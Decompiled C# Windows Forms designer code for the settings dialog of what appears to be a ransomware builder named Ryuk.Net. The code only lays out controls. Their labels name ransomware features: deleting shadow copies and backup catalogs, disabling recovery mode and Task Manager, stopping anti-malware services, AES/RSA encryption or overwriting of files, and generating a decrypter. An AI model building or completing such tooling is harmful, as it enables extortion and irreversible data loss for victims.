namespace Ryuk.Net
{
	// Token: 0x02000002 RID: 2
	public partial class advancedSettingForm : global::System.Windows.Forms.Form
	{
		// Token: 0x0600001D RID: 29 RVA: 0x00002AD0 File Offset: 0x00000CD0
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00002B08 File Offset: 0x00000D08
		private void InitializeComponent()
		{
			this.panel1 = new global::System.Windows.Forms.Panel();
			this.stopBackupsCheckbox = new global::System.Windows.Forms.CheckBox();
			this.taskManager = new global::System.Windows.Forms.CheckBox();
			this.label3 = new global::System.Windows.Forms.Label();
			this.pathToImageText = new global::System.Windows.Forms.TextBox();
			this.button1 = new global::System.Windows.Forms.Button();
			this.label2 = new global::System.Windows.Forms.Label();
			this.textBox1 = new global::System.Windows.Forms.TextBox();
			this.button2 = new global::System.Windows.Forms.Button();
			this.pathToXmlLabel = new global::System.Windows.Forms.Label();
			this.overwriteInfoLabel = new global::System.Windows.Forms.Label();
			this.radioButton2 = new global::System.Windows.Forms.RadioButton();
			this.radioButton1 = new global::System.Windows.Forms.RadioButton();
			this.label1 = new global::System.Windows.Forms.Label();
			this.deleteBackupCatalogCheckbox = new global::System.Windows.Forms.CheckBox();
			this.disableRecoveryModeCheckbox = new global::System.Windows.Forms.CheckBox();
			this.deleteShadowCopiesCheckbox = new global::System.Windows.Forms.CheckBox();
			this.resistAdminCheckbox = new global::System.Windows.Forms.CheckBox();
			this.openFileDialog1 = new global::System.Windows.Forms.OpenFileDialog();
			this.buttonZ1 = new global::CustomWindowsForm.ButtonZ();
			this.panel1.SuspendLayout();
			base.SuspendLayout();
			this.panel1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.panel1.Controls.Add(this.stopBackupsCheckbox);
			this.panel1.Controls.Add(this.taskManager);
			this.panel1.Controls.Add(this.label3);
			this.panel1.Controls.Add(this.pathToImageText);
			this.panel1.Controls.Add(this.button1);
			this.panel1.Controls.Add(this.label2);
			this.panel1.Controls.Add(this.textBox1);
			this.panel1.Controls.Add(this.button2);
			this.panel1.Controls.Add(this.pathToXmlLabel);
			this.panel1.Controls.Add(this.overwriteInfoLabel);
			this.panel1.Controls.Add(this.radioButton2);
			this.panel1.Controls.Add(this.radioButton1);
			this.panel1.Controls.Add(this.label1);
			this.panel1.Controls.Add(this.buttonZ1);
			this.panel1.Controls.Add(this.deleteBackupCatalogCheckbox);
			this.panel1.Controls.Add(this.disableRecoveryModeCheckbox);
			this.panel1.Controls.Add(this.deleteShadowCopiesCheckbox);
			this.panel1.Controls.Add(this.resistAdminCheckbox);
			this.panel1.Location = new global::System.Drawing.Point(2, 1);
			this.panel1.Name = "panel1";
			this.panel1.Size = new global::System.Drawing.Size(352, 459);
			this.panel1.TabIndex = 11;
			this.panel1.Paint += new global::System.Windows.Forms.PaintEventHandler(this.panel1_Paint);
			this.panel1.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.panel1_MouseDown);
			this.panel1.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.panel1_MouseMove);
			this.panel1.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.panel1_MouseUp);
			this.stopBackupsCheckbox.AutoSize = true;
			this.stopBackupsCheckbox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.stopBackupsCheckbox.Enabled = false;
			this.stopBackupsCheckbox.ForeColor = global::System.Drawing.Color.White;
			this.stopBackupsCheckbox.Location = new global::System.Drawing.Point(70, 225);
			this.stopBackupsCheckbox.Name = "stopBackupsCheckbox";
			this.stopBackupsCheckbox.Size = new global::System.Drawing.Size(212, 17);
			this.stopBackupsCheckbox.TabIndex = 35;
			this.stopBackupsCheckbox.Text = "Stop backup and anti malware services";
			this.stopBackupsCheckbox.UseVisualStyleBackColor = true;
			this.stopBackupsCheckbox.CheckedChanged += new global::System.EventHandler(this.stopBackupsCheckbox_CheckedChanged);
			this.taskManager.AutoSize = true;
			this.taskManager.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.taskManager.Enabled = false;
			this.taskManager.ForeColor = global::System.Drawing.Color.White;
			this.taskManager.Location = new global::System.Drawing.Point(70, 189);
			this.taskManager.Name = "taskManager";
			this.taskManager.Size = new global::System.Drawing.Size(128, 17);
			this.taskManager.TabIndex = 34;
			this.taskManager.Text = "Disable task manager";
			this.taskManager.UseVisualStyleBackColor = true;
			this.taskManager.CheckedChanged += new global::System.EventHandler(this.taskManager_CheckedChanged);
			this.label3.AutoSize = true;
			this.label3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label3.ForeColor = global::System.Drawing.Color.White;
			this.label3.Location = new global::System.Drawing.Point(19, 276);
			this.label3.Name = "label3";
			this.label3.Size = new global::System.Drawing.Size(169, 16);
			this.label3.TabIndex = 33;
			this.label3.Text = "Change desktop wallpaper";
			this.pathToImageText.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.pathToImageText.ForeColor = global::System.Drawing.Color.White;
			this.pathToImageText.Location = new global::System.Drawing.Point(21, 299);
			this.pathToImageText.Name = "pathToImageText";
			this.pathToImageText.Size = new global::System.Drawing.Size(205, 20);
			this.pathToImageText.TabIndex = 32;
			this.button1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.button1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.button1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.button1.ForeColor = global::System.Drawing.Color.White;
			this.button1.Location = new global::System.Drawing.Point(232, 295);
			this.button1.Name = "button1";
			this.button1.Size = new global::System.Drawing.Size(110, 26);
			this.button1.TabIndex = 31;
			this.button1.Text = "Select Image";
			this.button1.UseVisualStyleBackColor = false;
			this.button1.Click += new global::System.EventHandler(this.button1_Click_1);
			this.label2.AutoSize = true;
			this.label2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label2.ForeColor = global::System.Drawing.Color.White;
			this.label2.Location = new global::System.Drawing.Point(19, 391);
			this.label2.Name = "label2";
			this.label2.Size = new global::System.Drawing.Size(107, 16);
			this.label2.TabIndex = 30;
			this.label2.Text = "Decrypter Name";
			this.label2.Click += new global::System.EventHandler(this.label2_Click);
			this.textBox1.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.textBox1.ForeColor = global::System.Drawing.Color.White;
			this.textBox1.Location = new global::System.Drawing.Point(22, 410);
			this.textBox1.Name = "textBox1";
			this.textBox1.Size = new global::System.Drawing.Size(159, 20);
			this.textBox1.TabIndex = 29;
			this.textBox1.TextChanged += new global::System.EventHandler(this.textBox1_TextChanged);
			this.button2.BackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.button2.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.button2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.button2.ForeColor = global::System.Drawing.Color.White;
			this.button2.Location = new global::System.Drawing.Point(206, 404);
			this.button2.Name = "button2";
			this.button2.Size = new global::System.Drawing.Size(136, 26);
			this.button2.TabIndex = 28;
			this.button2.Text = "Create Decrypter";
			this.button2.UseVisualStyleBackColor = false;
			this.button2.Click += new global::System.EventHandler(this.button2_Click);
			this.pathToXmlLabel.AutoSize = true;
			this.pathToXmlLabel.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.pathToXmlLabel.ForeColor = global::System.Drawing.Color.White;
			this.pathToXmlLabel.Location = new global::System.Drawing.Point(24, 355);
			this.pathToXmlLabel.Name = "pathToXmlLabel";
			this.pathToXmlLabel.Size = new global::System.Drawing.Size(0, 16);
			this.pathToXmlLabel.TabIndex = 26;
			this.pathToXmlLabel.Click += new global::System.EventHandler(this.pathToXmlLabel_Click);
			this.overwriteInfoLabel.AutoSize = true;
			this.overwriteInfoLabel.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.overwriteInfoLabel.ForeColor = global::System.Drawing.Color.White;
			this.overwriteInfoLabel.Location = new global::System.Drawing.Point(22, 365);
			this.overwriteInfoLabel.Name = "overwriteInfoLabel";
			this.overwriteInfoLabel.Size = new global::System.Drawing.Size(275, 16);
			this.overwriteInfoLabel.TabIndex = 24;
			this.overwriteInfoLabel.Text = "Files will be encrypted with AES/RSA method";
			this.overwriteInfoLabel.Click += new global::System.EventHandler(this.overwriteInfoLabel_Click);
			this.radioButton2.AutoSize = true;
			this.radioButton2.Checked = true;
			this.radioButton2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.radioButton2.ForeColor = global::System.Drawing.Color.White;
			this.radioButton2.Location = new global::System.Drawing.Point(206, 345);
			this.radioButton2.Name = "radioButton2";
			this.radioButton2.Size = new global::System.Drawing.Size(142, 20);
			this.radioButton2.TabIndex = 23;
			this.radioButton2.TabStop = true;
			this.radioButton2.Text = "Encrypt  AES / RSA";
			this.radioButton2.UseVisualStyleBackColor = true;
			this.radioButton2.Visible = false;
			this.radioButton2.CheckedChanged += new global::System.EventHandler(this.radioButton2_CheckedChanged);
			this.radioButton1.AutoSize = true;
			this.radioButton1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			this.radioButton1.ForeColor = global::System.Drawing.Color.White;
			this.radioButton1.Location = new global::System.Drawing.Point(30, 345);
			this.radioButton1.Name = "radioButton1";
			this.radioButton1.Size = new global::System.Drawing.Size(126, 20);
			this.radioButton1.TabIndex = 22;
			this.radioButton1.Text = "Overwrite all files";
			this.radioButton1.UseVisualStyleBackColor = true;
			this.radioButton1.Visible = false;
			this.radioButton1.CheckedChanged += new global::System.EventHandler(this.radioButton1_CheckedChanged);
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 20.25f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.label1.ForeColor = global::System.Drawing.Color.White;
			this.label1.Location = new global::System.Drawing.Point(5, 8);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(301, 31);
			this.label1.TabIndex = 21;
			this.label1.Text = "Decrypter and options";
			this.deleteBackupCatalogCheckbox.AutoSize = true;
			this.deleteBackupCatalogCheckbox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.deleteBackupCatalogCheckbox.Enabled = false;
			this.deleteBackupCatalogCheckbox.ForeColor = global::System.Drawing.Color.White;
			this.deleteBackupCatalogCheckbox.Location = new global::System.Drawing.Point(70, 120);
			this.deleteBackupCatalogCheckbox.Name = "deleteBackupCatalogCheckbox";
			this.deleteBackupCatalogCheckbox.Size = new global::System.Drawing.Size(152, 17);
			this.deleteBackupCatalogCheckbox.TabIndex = 19;
			this.deleteBackupCatalogCheckbox.Text = "Delete the backup catalog";
			this.deleteBackupCatalogCheckbox.UseVisualStyleBackColor = true;
			this.deleteBackupCatalogCheckbox.CheckedChanged += new global::System.EventHandler(this.deleteBackupCatalogCheckbox_CheckedChanged);
			this.disableRecoveryModeCheckbox.AutoSize = true;
			this.disableRecoveryModeCheckbox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.disableRecoveryModeCheckbox.Enabled = false;
			this.disableRecoveryModeCheckbox.ForeColor = global::System.Drawing.Color.White;
			this.disableRecoveryModeCheckbox.Location = new global::System.Drawing.Point(70, 155);
			this.disableRecoveryModeCheckbox.Name = "disableRecoveryModeCheckbox";
			this.disableRecoveryModeCheckbox.Size = new global::System.Drawing.Size(178, 17);
			this.disableRecoveryModeCheckbox.TabIndex = 18;
			this.disableRecoveryModeCheckbox.Text = "Disable windows recovery mode";
			this.disableRecoveryModeCheckbox.UseVisualStyleBackColor = true;
			this.disableRecoveryModeCheckbox.CheckedChanged += new global::System.EventHandler(this.disableRecoveryModeCheckbox_CheckedChanged);
			this.deleteShadowCopiesCheckbox.AutoSize = true;
			this.deleteShadowCopiesCheckbox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.deleteShadowCopiesCheckbox.Enabled = false;
			this.deleteShadowCopiesCheckbox.ForeColor = global::System.Drawing.Color.White;
			this.deleteShadowCopiesCheckbox.Location = new global::System.Drawing.Point(70, 84);
			this.deleteShadowCopiesCheckbox.Name = "deleteShadowCopiesCheckbox";
			this.deleteShadowCopiesCheckbox.Size = new global::System.Drawing.Size(190, 17);
			this.deleteShadowCopiesCheckbox.TabIndex = 17;
			this.deleteShadowCopiesCheckbox.Text = "Delete all Volumes Shadow Copies";
			this.deleteShadowCopiesCheckbox.UseVisualStyleBackColor = true;
			this.deleteShadowCopiesCheckbox.CheckedChanged += new global::System.EventHandler(this.deleteShadowCopiesCheckbox_CheckedChanged);
			this.resistAdminCheckbox.AutoSize = true;
			this.resistAdminCheckbox.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.resistAdminCheckbox.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9.75f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.resistAdminCheckbox.ForeColor = global::System.Drawing.Color.White;
			this.resistAdminCheckbox.Location = new global::System.Drawing.Point(57, 52);
			this.resistAdminCheckbox.Name = "resistAdminCheckbox";
			this.resistAdminCheckbox.Size = new global::System.Drawing.Size(212, 20);
			this.resistAdminCheckbox.TabIndex = 16;
			this.resistAdminCheckbox.Text = "Resist for admin privileges";
			this.resistAdminCheckbox.UseVisualStyleBackColor = true;
			this.resistAdminCheckbox.CheckedChanged += new global::System.EventHandler(this.resistAdminCheckbox_CheckedChanged);
			this.openFileDialog1.FileName = "openFileDialog1";
			this.buttonZ1.Anchor = (global::System.Windows.Forms.AnchorStyles.Top | global::System.Windows.Forms.AnchorStyles.Right);
			this.buttonZ1.BZBackColor = global::System.Drawing.Color.FromArgb(30, 30, 30);
			this.buttonZ1.DisplayText = "X";
			this.buttonZ1.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.buttonZ1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f, global::System.Drawing.FontStyle.Bold, global::System.Drawing.GraphicsUnit.Point, 0);
			this.buttonZ1.ForeColor = global::System.Drawing.Color.White;
			this.buttonZ1.Location = new global::System.Drawing.Point(321, 0);
			this.buttonZ1.MouseClickColor1 = global::System.Drawing.Color.FromArgb(60, 60, 160);
			this.buttonZ1.MouseHoverColor = global::System.Drawing.Color.FromArgb(50, 50, 50);
			this.buttonZ1.Name = "buttonZ1";
			this.buttonZ1.Size = new global::System.Drawing.Size(31, 24);
			this.buttonZ1.TabIndex = 20;
			this.buttonZ1.Text = "X";
			this.buttonZ1.TextLocation_X = 6;
			this.buttonZ1.TextLocation_Y = 1;
			this.buttonZ1.UseVisualStyleBackColor = true;
			this.buttonZ1.Click += new global::System.EventHandler(this.buttonZ1_Click_1);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(25, 25, 25);
			base.ClientSize = new global::System.Drawing.Size(356, 461);
			base.Controls.Add(this.panel1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Name = "advancedSettingForm";
			base.ShowInTaskbar = false;
			base.StartPosition = global::System.Windows.Forms.FormStartPosition.CenterScreen;
			this.Text = "advancedSettingForm";
			base.Load += new global::System.EventHandler(this.advancedSettingForm_Load);
			base.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.advancedSettingForm_MouseDown);
			base.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.advancedSettingForm_MouseMove);
			base.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.advancedSettingForm_MouseUp);
			this.panel1.ResumeLayout(false);
			this.panel1.PerformLayout();
			base.ResumeLayout(false);
		}

		// Token: 0x04000003 RID: 3
		private global::System.ComponentModel.IContainer components = null;

		// Token: 0x04000004 RID: 4
		private global::System.Windows.Forms.Panel panel1;

		// Token: 0x04000005 RID: 5
		private global::CustomWindowsForm.ButtonZ buttonZ1;

		// Token: 0x04000006 RID: 6
		private global::System.Windows.Forms.CheckBox deleteBackupCatalogCheckbox;

		// Token: 0x04000007 RID: 7
		private global::System.Windows.Forms.CheckBox disableRecoveryModeCheckbox;

		// Token: 0x04000008 RID: 8
		private global::System.Windows.Forms.CheckBox deleteShadowCopiesCheckbox;

		// Token: 0x04000009 RID: 9
		private global::System.Windows.Forms.CheckBox resistAdminCheckbox;

		// Token: 0x0400000A RID: 10
		private global::System.Windows.Forms.Label label1;

		// Token: 0x0400000B RID: 11
		private global::System.Windows.Forms.OpenFileDialog openFileDialog1;

		// Token: 0x0400000C RID: 12
		private global::System.Windows.Forms.Label pathToXmlLabel;

		// Token: 0x0400000D RID: 13
		private global::System.Windows.Forms.Button button2;

		// Token: 0x0400000E RID: 14
		private global::System.Windows.Forms.TextBox textBox1;

		// Token: 0x0400000F RID: 15
		private global::System.Windows.Forms.Label label2;

		// Token: 0x04000010 RID: 16
		private global::System.Windows.Forms.Label label3;

		// Token: 0x04000011 RID: 17
		private global::System.Windows.Forms.TextBox pathToImageText;

		// Token: 0x04000012 RID: 18
		private global::System.Windows.Forms.Button button1;

		// Token: 0x04000013 RID: 19
		private global::System.Windows.Forms.RadioButton radioButton2;

		// Token: 0x04000014 RID: 20
		private global::System.Windows.Forms.RadioButton radioButton1;

		// Token: 0x04000015 RID: 21
		private global::System.Windows.Forms.Label overwriteInfoLabel;

		// Token: 0x04000016 RID: 22
		private global::System.Windows.Forms.CheckBox taskManager;

		// Token: 0x04000017 RID: 23
		private global::System.Windows.Forms.CheckBox stopBackupsCheckbox;
	}
}
